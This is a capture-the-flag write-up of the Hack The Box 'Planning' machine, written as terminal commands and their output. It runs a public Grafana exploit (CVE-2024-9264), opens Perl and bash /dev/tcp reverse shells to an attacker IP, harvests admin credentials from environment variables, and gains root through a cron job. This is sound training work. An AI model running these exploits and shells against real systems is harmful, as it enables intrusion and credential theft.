### Hack The Box Writeup: Planning

## Overview

- **Machine Name**: Planning
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: 
- **Date Solved**: JUne 2025

This writeup details my approach to solving the Planning machine on Hack The Box, including enumeration, exploitation, and privilege escalation. 

## Tools Used

- **Enumeration**: 
- **Exploitation**: 
- **Privilege Escalation**: 
- **Other**: 

## Methodology

### Initial Enumeration

```bash
ping -c 1 10.10.11.68
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.11.68 -oG allPorts
nmap -sCV -p22,80 10.10.11.68 -oN targeted

nvim /etc/hosts
# put URL reported in nmap 

whatweb http://planning.htb

nmap --script http-enum -p80 10.10.11.68 -oN webScan

# Looking for subdomains
gobuster vhost -u http://planning.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

ffuf -u http://planning.htb -H "Host: FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200

# subdomain
http://grafana.planning.htb

# admin
# 0D5oT70Fq13EvB5r

whatweb http://grafana.planning.htb 

# ans
http://grafana.planning.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block], nginx[1.24.0]
http://grafana.planning.htb/login [200 OK] Country[RESERVED][ZZ], Grafana[11.0.0], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.24.0]

# Search grafana 11.0.0 exploit

```

### Exploitation

https://github.com/nollium/CVE-2024-9264

```bash
git clone https://github.com/nollium/CVE-2024-9264
mv CVE-2024-9264 grafana_exploit

cd grafana_exploit
pip3 install -r requirements.txt --break-system-packages

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd  http://grafana.planning.htb

# ans
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Reading file: /etc/passwd
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/etc/passwd'):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c id http://grafana.planning.htb

# ans
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: id
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
uid=0(root) gid=0(root) groups=0(root)

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb

# ans
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: whoami
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 
|'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
root

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la" http://grafana.planning.htb

# ans
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls -la
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls -la >/tmp/grafana_cmd_output 2>&1 
|'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
total 76
drwxr-xr-x  1 root    root  4096 Jun  4 00:26 .
drwxr-xr-x  1 root    root  4096 May 14  2024 ..
drwxrwxrwx  2 grafana root  4096 May 14  2024 .aws
-rw-------  1 root    root   219 Jun  4 01:36 .bash_history
drwxr-xr-x  3 root    root  4096 Mar  1 18:01 .duckdb
-rw-r--r--  1 root    root 34523 May 14  2024 LICENSE
-rw-r--r--  1 root    root   703 Jun  4 00:26 bash
drwxr-xr-x  2 root    root  4096 May 14  2024 bin
drwxr-xr-x  3 root    root  4096 May 14  2024 conf
drwxr-xr-x 16 root    root  4096 May 14  2024 public

>
perl -e 'use Socket;$i="10.10.15.66";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'perl -e "use Socket;\$i=\"10.10.15.66\"; \$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"' http://grafana.planning.htb

# we are in!


```

### Privilege Escalation


```bash
printenv # to view variables

# ans
SHELL=bash
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/bin
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
TERM=xterm
AWS_AUTH_EXTERNAL_ID=
SHLVL=4
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT! # use
GF_SECURITY_ADMIN_USER=enzo # use
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
OLDPWD=/
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/printenv

ssh enzo@10.10.11.68

find / -perm -4000 2>/dev/null

# ans
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/gpasswd

netstat -tuln

# ans
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:39479         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.54:53           0.0.0.0:*                          
udp        0      0 127.0.0.53:53           0.0.0.0:* 

>

ssh -L 8000:localhost:8000 enzo@10.10.11.68 # local port forwarding (ssh same pass)

http://localhost:8000
# user: root
# pass: crontab.db pass

# Just aggregat a new conr jon based on a rev shell

nc -nlvp 4646 # local machine
bash -c "bash -i &> /dev/tcp/10.10.15.66/4646 0>&1"

cd root/
cat root.txt


```

## Challenges Faced


- **Challenge 1**: New vhost discovering by grafana
  - **Solution**: Add this one to the dict
- **Challenge 2**: Check ports to view running services
  - **Solution**: Use a specific command

## Lessons Learned


## References

https://www.cve.org/CVERecord?id=CVE-2024-9264

---

*Written by edibauer, 06 2025. Feedback welcome at https://github.com/edibauer*